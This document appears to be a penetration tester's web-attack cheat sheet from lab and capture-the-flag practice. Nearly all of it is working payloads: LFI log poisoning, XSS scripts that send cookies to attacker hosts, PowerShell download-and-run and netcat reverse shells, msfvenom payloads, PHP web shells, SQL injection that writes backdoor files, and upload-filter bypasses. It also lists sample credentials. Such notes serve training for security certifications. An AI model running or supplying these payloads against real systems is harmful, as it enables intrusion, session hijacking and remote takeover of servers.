

Web Application Attacks:
	**Always try to Find the Application Version**
  Tools:
    burpsuite (set up w/ foxyproxy extension)
    cookie editor extension
  Things to Check:
  	Source code
		comments, urls, hard-coded credentials, functions, etc.
    	Browser Dev Tools->Network Headers->Response Headers->server versions, etc.
	Cookies
	Requests & responses in burpsuite -> try to break things & produce errors
	Input boxes:
		code injection
		sql injection
		xss
	URLs: look for strange parameters, file extensions, etc.
	Anywhere to upload files? - profile picture, plugins, etc.
Techniques:

Admin Consoles:
        look up default credentials
	See password attacks page
		brute force, try scraping from website
- Input Boxes:
	Code injection test: ; id
	SQLI Test: ' or "

	?code=phpinfo()
	?code=system('id'); (if single line output)
	?code=echo shell_exec('/sbin/ifconfig eth0'); (if multiple line output)
URL:
    - LFI:  actually executes the file; 'include' statement means code is executed            
        - ex. ?page=/../../../../../etc/passwd OR ?file=c:\windows\system32\drivers\etc\hosts 
        - See LFI Interesting Files
		Windows:  https://notchxor.github.io/oscp-notes/4-win-privesc/15-LFI-FILES/
        - Tip: put %00 at end:  ex. http://target.com/?page=./../../../../../../../../../etc/passwd%00
        - LFI Cheat Sheat/reverse shell methods:  https://highon.coffee/blog/lfi-cheat-sheet/
	PHP Wrapper Method:
            http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
    - LFI TO RCE:
        - Log poisoning
            - See what logs you can include, then figure out how to get that service to log your request
            - ex. log into ftp server with user of '<? php system($_GET['cmd']); ?>' , then lfi the var/log/vsftpd.log
            - /var/log/apache2/access.log:   `nc 1.1.1.1 80, then GET /<?php system($_GET['cmd']);?>`
            - /proc/self/environ: use burp (https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1) to send malicious url with a modified user-agent
            - Windows: `?file=c:\xampp\apache\logs\access.log&cmd=ipconfig   nc -nv 1.1.1.1 80 ,   <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`
            - Email method:  https://bitvijays.github.io/LFC-VulnerableMachines.html
	    LFI log contamination tactic: connect w/:  nc -nv 10.11.0.22 80, then send:  <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
            then:  http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
    - RFI:
    	ex. make and host a local evil.txt file:  <?php echo shell_exec($_GET['cmd']); ?>
                http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
        - Try shell saved as .txt, .php, etc. - see what type of scripts the site uses
        - works if allow_url_fopen and allow_url_include both = On in the file /etc/php5/cgi/php.ini -- php.ini location is seen in phpinfo.php file
        - ex. Using reverse.txt php shell:  `?page=http://1.2.3.4/reverse.txt?  OR:  ?page=http://1.2.3.4/reverse.txt%00`
  
  

  XSS:
        Stored: look for comments, reviews, user profile info, etc.
        Reflected: search box, etc.
        Look for unsanitized input that is displayed as output; characters to try:  < > ' " { } ;  -> Check Source Code; see how they're stored
        Basic payload:  <script>alert(‘XSS’)</script>
        if Secure and HTTPOnly flags not set, we can steal authenticated user cookies:   <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
            catch with:   sudo nc -nvlp 80
        Beef Framework tool
XSS:
CHEAT SHEAT/test input:  https://www.jb51.net/tools/xss.htm
-client-side
3 types: persistent/stored, reflected, DOM based
Tests:
<script>alert("XSS")</script>
<img src="10.10.14.18/test.jpg" /> <script src="http://10.10.14.18/test.js"></script>
Steal Cookie:
<script>new Image().src="http://10.10.28.40:8000/cool.jpg?output="+document.cookie;</script>
sudo nc -nvlp 80
<script>document.location="http://10.10.14.18 username="+document.cookie;</script>
Reliable Method of cookie stealing:
<script src="http://10.10.14.18/xss.js"></script>
make xss.js file:
function pwn() {
    var img = document.createElement("img");
    img.src = "http://10.10.14.18/xss?=" + document.cookie;
    document.body.appendChild(img);
}
pwn();
python -m SimpleHTTPServer 80
................................................................................
Example: XSS Reverse Shell (if the website can run the dir command):
<script>callSys("dir | powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.18:80/mini-reverse.ps1')");</script>
	Better with msfvenom: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f exe -o payload.exe
	<script>callSys("dir | powershell IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.18:80/payload.exe','C:/temp/payload.exe')");</script>	

Try javascript code in all input boxes, username/password (if displays incorrect username), search (if results display the searched keywords) -- or URLs
Stored: comment section, guestbook, contact form, user profile, etc.
	Upload BEEF hook: <script src="http://1.2.3.4:3000/hook.js"></script>  (copy from beef program) -- take control of another user
Content injection:   <img src=http://10.10.15.25/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.15.25'$IFS'4444')>
Template injection: https://shubham-singh.medium.com/doctor-htb-walkthrough-70bcb9eedefd and https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology

XSRF: if you can get a user to click a link, etc.
See if you have a password reset form, etc. that can be submitted via url -- make the admin account click it and change to your desired password
ex. http://10.10.10.97/change_pass.php?password=password&confirm_password=password&submit=submit
http://10.10.14.18/complete



SQL Injection:
        when queries are sent to a database for execution
        Test: see if ' causes errors in any field
            see if ?cod=1+and+2=2  still displays correctly
                column counting:  cod=1+union+select+1,2
                room.php?cod=1+union+select+1,2,3,4,5,6,'<?php_system($_GET["cmd"]); ?>' into outfile '/var/www/html/cmd.php'
        Authentication bypass:
            tom' or 1=1;#
            if multiple row error:   tom' or 1=1 LIMIT 1;#
        SEE HOW DATA IS DISPLAYED, then extract:
        1. column number enumeration:
            ?id=1 order by 1;    -----increment until error
        2. do a union (but w/ same # of columns):
            ex. if 4 columns:   ?id=1 union all select 1, 2, 3
        Then extract data (for mariadb at least):  union all select 1, 2, @@version,  union all select 1, 2, user(),  
        union all select 1, 2, table_name from information_schema.tables
            union all select 1, 2, column_name from information_schema.columns where table_name='users'
            ?id=1 union all select 1, username, password from users
        Read File:  ?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
        Make Backdoor:  ?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
            access:  10.11.0.22/backdoor.php?cmd=ifconfig
        WINDOWS: create admin user and add user to RDP group (see PWK lab notes)
        Automated: sqlmap (NO OSCP)
            sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
                all data:   sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
                Shell:   sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell



SQL Injections:
SQL command LFI/reverse shell:  add field in table with value:  <?php system($_REQUEST["cmd"]);?>
CHEAT SHEET test cmds:  https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/ or  https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html
Select * from accounts where username='$user' and password='$pass'
Figure out which input fields are injectable by trying to break them:
'
"
Comment: # (MySQL) or -- (standard SQL)
Try adding true and false and statements after your input to see if injectable.
username:  admin'#
password:   abc' OR 1=1#
abc' OR 1=1--
0' or '0'='0
See how many columns are returned, then return other things:
0' or 1=1 UNION SELECT null, version() #
0' or 1=1 UNION SELECT user(), database() #
*See SQL functions file
Other tables:  0' or 0=0 UNION SELECT table_schema, table_name from information_schema.tables #
Tables and columns:  0' or 0=0 UNION SELECT 1,concat(table_name,char(58),column_name) from information_schema.columns #
Then get values:  0' or 0=0 UNION SELECT user, password from tikiwiki195.tiki_users #

Writing to file/getting RCE/shell:  Asus' union select '<?php system($_GET[\'cmd\']); ?>',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/_0xdf.php'#


union

Watch for URL parameters--try to inject (after http encoding it)
Figure out how many columns are selected (increase number until error): &username=zaid' order by 1# --> &username=zaid' order by 1%23
Determine table names, then column names
ex. If 5 columns:  &username=zaid' union select 1,2,3,4,5%23 (shows where things are displayed) (Displays anything:) &username=zaid' union select 1,database(),user(),version(),5%23
	table names:  union select 1,table_name,null,null,5 from information_schema.tables	  where table_schema = 'tableName1'
	column names in a table:  union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'
	fields:  union select 1,username,password,is_admin,5 from accounts
Reading/writing any file from database:
	union select null,load_file('/etc/passwd'),null,null,null
	union select null,'example text',null,null,null into outfile '/var/www/mutillidae/example.txt'   (or to /tmp/example.txt)

**Automated SQL Tool: SQLMap
	Scan parameters: sqlmap -u "full url w/ parameters"
	Many options: sqlmap --help
	******SQLMAP SHELL:  sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --os-shell


**NOSQL INJECTION: in burp, try: username[$ne]=..., password[$ne]=...
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
If injection succeeds, enumerate accounts with: https://raw.githubusercontent.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/master/nosqli-user-pass-enum.py
python3 mangoenum.py -u http://staging-order.mango.htb/ -up username -pp password -op login:login -ep username
then: python3 mangoenum.py -u http://staging-order.mango.htb/ -up username -pp password -op login:login -ep password

Web Shells:
webshell.php:  <?php echo shell_exec($_GET['cmd']); ?>
	http://127.0.0.1/webshell.php?cmd=id
	http://127.0.0.1/wordpress/?cmd=nc [IP attack box] [port] -e /bin/sh
<?php system($_GET["cmd"]); ?>
<? passthru($_GET["cmd"]); ?>


-Insert code into Wordpress/Joomla theme file
-if blocked, try common port like 80 or 443
-URL encoding of characters



File Upload:
	General Upload Test:  `davtest -url http://10.10.10.15`
	Filter Bypass:
		https://book.hacktricks.xyz/pentesting-web/file-upload
		- Rename:
			Try upload as shell.php.jpg or shell.php%00.jpg or shell.jpg.php
			.php, .pht, .phtml, .php3, .php4, .php5, .inc
			.asp, .aspx
			.pl, .pm, .cgi, .lib
			.jsp, .jspx, .jsw, .jsv, .jspf
			.cfm, .cfml, .cfc, .dbm
		- Rename after uploading (ex. upload as .html, then move to .aspx):
			    - Upload file with curl:  `curl http://10.10.10.15/ --upload-file shell.txt`
				- or:   `curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php`
			- Move/Rename file:  `curl -X MOVE --header "Destination:http://10.10.10.15/shell.aspx" http://10.10.10.15/shell.txt`
				- ex.  `curl -X MOVE --header "Destination:http://10.10.10.15/nc.exe" http://10.10.10.15/nc.txt`
		-Bypass MIME type validation:
			Burpsuite: modify POST request Content-Type header
			Edit magic bytes:  echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png
				Or:  add before shellcode: `GIF89a;`
		-Image Hidden PHP Code (bypasses getimagesize() validation):
			w/ Gimp--put code in properties/comments 
			exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
	ex. PHP code in image:
		cp original.png ./shell.php.png
		echo '<?php' >> ./shell.php.png
		echo 'passthru("whoami");' >> ./shell.php.png
		#echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f");' >> ./shell.php.png
			Or: echo 'system($_REQUEST["cmd"]);' >> ./shell2.php.png
		echo '?>' >> ./shell.php.png
		visit example.com/uploads/shell.php.png or example.com/uploads/shell.php.png?cmd=id



Password Attacks:

PHP LOGIN PASSWORD BYPASS IN BURP:  username=admin&password[]=

Creating brute-force password lists: Crunch, Cewl (website-crawler)
Scraping emails from website:  cewl -n -e --email_file mailid.txt http://sneakycorp.htb

IF CGI-BIN DIRECTORY IS FOUND, LOOK FOR .SH SCRIPTS:  for shellshock
dirb http://10.10.10.56/cgi-bin -X .sh

  
  

PHP Injection:
<?php if (isset($_REQUEST[‘fupload’])) { file_put_contents($_REQUEST[‘fupload’], file_get_contents(‘http://IP_ADDR/' . $_REQUEST[‘fupload’])); }; if (isset($_REQUEST[‘fexec’])) { echo ‘<pre>’ . shell_exec($_REQUEST[‘fexec’]) . ‘</pre>’; }; ?>
access it: <filename>.php?fupload=nc.exe (for example) and <filename>.php?fexec=nc IP PORT
Linux Reverse Shell:  http://pentestmonkey.net/tools/web-shells/php-reverse-shell
Windows Reverse Shell:  https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php
  
  
  
  
  
Specific Applications:
	PHPMyAdmin:
		in sql console:  select * from webappdb.users;
		make a user:  insert into webappdb.users(password, username) VALUES (”backdoor“,”backdoor“);

	Tomcat Web Application Manger War Shell Upload:
		msfvenom -p java/shell_reverse_tcp lhost=10.10.14.18 lport=4444 -f war -o pwn.war
		***: curl -T "pwn.war" -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/miao&update=true"
		Or automate with:  https://github.com/mgeeky/tomcatWarDeployer
		python autowar.py http://10.10.10.95:8080 -U tomcat -P s3cret -H <attacking machine IP> -P 4321
